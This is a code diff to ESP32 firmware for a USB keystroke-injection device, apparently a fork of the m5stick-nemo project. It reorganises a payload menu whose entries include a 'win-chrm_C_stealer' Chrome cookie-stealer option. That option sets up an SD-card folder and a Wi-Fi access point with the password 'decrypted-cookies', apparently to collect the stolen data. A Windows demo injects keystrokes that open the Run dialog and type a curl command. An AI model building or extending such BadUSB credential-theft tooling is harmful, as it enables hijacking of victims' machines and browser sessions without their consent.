@@ -4,17 +4,15 @@
 #include <WiFiMulti.h>
 #include <WiFiClientSecure.h>
 #include "USB.h"
-#include "USBHIDKeyboard.h"
+#include "src/USB/src/USBHIDKeyboard.h"
 #include <ESPAsyncWebServer.h>
-USBHIDKeyboard Keyboard;
-const int buttonPin = 0;
-bool screen_dim_dimmedL = false;
-int screen_dim_timeL = 30;
-int screen_dim_currentL = 0;
+
+#define FILES_DIR "/win-chrm"
+String files_dir = "/win-chrm";  
 String full_files_dir = "/win-chrm/";
-String files_dir = "/win-chrm";
-String ssid = String("AP-0");
-String password = String("decrypted-cookies");
+String password = "decrypted-cookies";
+String ssid = "AP-0";
+USBHIDKeyboard Keyboard;
 File root;
 
 AsyncWebServer server(80);
@@ -24,12 +22,64 @@ struct MENUL {
   int command;
 };
 
+void rootPayload0(void);
+void demo_android(void);
+void demo_ios(void);
+void demo_macos(void);
+void demo_windows(void);
+
+static MENUL bumenu[] = { // edit this to add payloads!
+  { TXT_BACK, 0},
+  { "win-chrm_C_stealer", 1},
+  { "demo_android", 2},
+  { "demo_ios", 3},
+  { "demo_macos", 4},
+  { "demo_windows", 5},
+};
+
+int bumenu_size = sizeof(bumenu) / sizeof (MENUL);
+
+void payloads_menu(int option){ // edit this to add payloads!
+    switch(option) {
+      case 0:
+        rstOverride = false;
+        isSwitching = true;
+        current_proc = 1;
+        break;
+      case 1:
+        rootPayload0();
+        break;
+      case 2:
+        demo_android();
+        break;
+      case 3:
+        demo_ios();
+        break;
+      case 4:
+        demo_macos();
+        break;
+      case 5:
+        demo_windows();
+        break;
+    }
+}
+
 void demo_android(){ // 2
     DISP.fillScreen(BGCOLOR);
     DISP.setCursor(0, 0);
     DISP.setTextColor(BGCOLOR, FGCOLOR);
     DISP.println("android demo");
     DISP.setTextColor(FGCOLOR, BGCOLOR);
+    DISP.println("Running payload...");
+    delay(2000);
+
+    // To open GUI menu:
+    
+    // Keyboard.pressRaw(HID_KEY_GUI_LEFT);
+    // delay(500);
+    // Keyboard.releaseRaw(HID_KEY_GUI_LEFT);   
+
+    DISP.print("done.");
     DISP.printf(TXT_SEL_BACK);
 }
 
@@ -39,15 +89,37 @@ void demo_ios(){ // 3
     DISP.setTextColor(BGCOLOR, FGCOLOR);
     DISP.println("ios demo");
     DISP.setTextColor(FGCOLOR, BGCOLOR);
+    DISP.println("Running payload...");
+    delay(2000);
+
+    // To open GUI menu:
+    
+    // Keyboard.pressRaw(HID_KEY_GUI_LEFT);
+    // delay(500);
+    // Keyboard.releaseRaw(HID_KEY_GUI_LEFT);   
+
+    DISP.print("done.");
     DISP.printf(TXT_SEL_BACK);
 }
 
 void demo_macos(){ // 4
+    Keyboard.begin();
+    USB.begin();
     DISP.fillScreen(BGCOLOR);
     DISP.setCursor(0, 0);
     DISP.setTextColor(BGCOLOR, FGCOLOR);
     DISP.println("macos demo");
     DISP.setTextColor(FGCOLOR, BGCOLOR);
+    DISP.println("Running payload...");
+    delay(2000);
+
+    // To open GUI menu:
+    
+    // Keyboard.pressRaw(HID_KEY_GUI_LEFT);
+    // delay(500);
+    // Keyboard.releaseRaw(HID_KEY_GUI_LEFT);   
+
+    DISP.print("done.");
     DISP.printf(TXT_SEL_BACK);
 }
 
@@ -61,6 +133,13 @@ void demo_windows(){ // 5
     DISP.setTextColor(FGCOLOR, BGCOLOR);
     DISP.println("Running payload...");
     delay(2000);   
+
+    // To open GUI menu:
+
+    // Keyboard.pressRaw(HID_KEY_GUI_LEFT);
+    // delay(500);
+    // Keyboard.releaseRaw(HID_KEY_GUI_LEFT);
+
     Keyboard.press(KEY_LEFT_GUI);
     Keyboard.press('r');
     Keyboard.releaseAll();
@@ -69,22 +148,11 @@ void demo_windows(){ // 5
     Keyboard.press(KEY_RETURN);
     Keyboard.releaseAll();
     delay(2000);
-    Keyboard.print(GET_ASCII_ART);
+    Keyboard.print("curl https://raw.githubusercontent.com/usg-ishimura/m5stick-nemo/main/ascii/NEMO.txt");
     Keyboard.press(KEY_RETURN);
     Keyboard.releaseAll();
     DISP.print("done.");
     DISP.printf(TXT_SEL_BACK);
-}
-
-bool createDir(fs::FS &fs, const char * path){
-  Serial.printf("Creating Dir: %s\n", path);
-  if(fs.mkdir(path)){
-    Serial.println("Dir created/exists");
-    return true;
-  } else {
-    Serial.println("mkdir failed");
-    return false;
-  }
 }
 
 String ip2String(const IPAddress& address){
@@ -115,6 +183,17 @@ String printDirectory_listing(File dir, int numTabs) {
   }
 
   return String("List files in <b>/</b>win-chrm:<br>") + response;
+}
+
+bool createDir(fs::FS &fs, const char * path){
+  Serial.printf("Creating Dir: %s\n", path);
+  if(fs.mkdir(path)){
+    Serial.println("Dir created/exists");
+    return true;
+  } else {
+    Serial.println("mkdir failed");
+    return false;
+  }
 }
 
 String filename_exists(String filename, int count, String filename_original){
@@ -224,7 +303,7 @@ void run_payload_setup(){
   DISP.printf(TXT_SEL_BACK);
 }
 
-void rootPayload0(){
+void rootPayload0(){ // 1
     if(!setupSdCard()){
         rstOverride = true;
         isSwitching = false;
@@ -235,7 +314,7 @@ void rootPayload0(){
         DISP.println("Failed to mount SDCARD, is it inserted? Can't continue with payload execution...");
         DISP.printf(TXT_SEL_BACK);
     } else {
-      if(createDir(SD, PYLD_DIR)){
+      if(createDir(SD, FILES_DIR)){
         run_payload_setup();
       } else {
         rstOverride = true;
@@ -247,42 +326,6 @@ void rootPayload0(){
         DISP.println("Failed to create payloads DIR, is the SDCARD inserted? Can't continue with the execution...");
         DISP.printf(TXT_SEL_BACK);
       }
-    }
-}
-
-static MENUL bumenu[] = { // edit this to add payloads!
-  { TXT_BACK, 0},
-  { "win-chrm_C_stealer", 1},
-  { "demo_android", 2},
-  { "demo_ios", 3},
-  { "demo_macos", 4},
-  { "demo_windows", 5},
-};
-
-int bumenu_size = sizeof(bumenu) / sizeof (MENUL);
-
-void payloads_menu(int option){ // edit this to add payloads!
-    switch(option) {
-      case 0:
-        rstOverride = false;
-        isSwitching = true;
-        current_proc = 1;
-        break;
-      case 1:
-        rootPayload0();
-        break;
-      case 2:
-        demo_android();
-        break;
-      case 3:
-        demo_ios();
-        break;
-      case 4:
-        demo_macos();
-        break;
-      case 5:
-        demo_windows();
-        break;
     }
 }
 
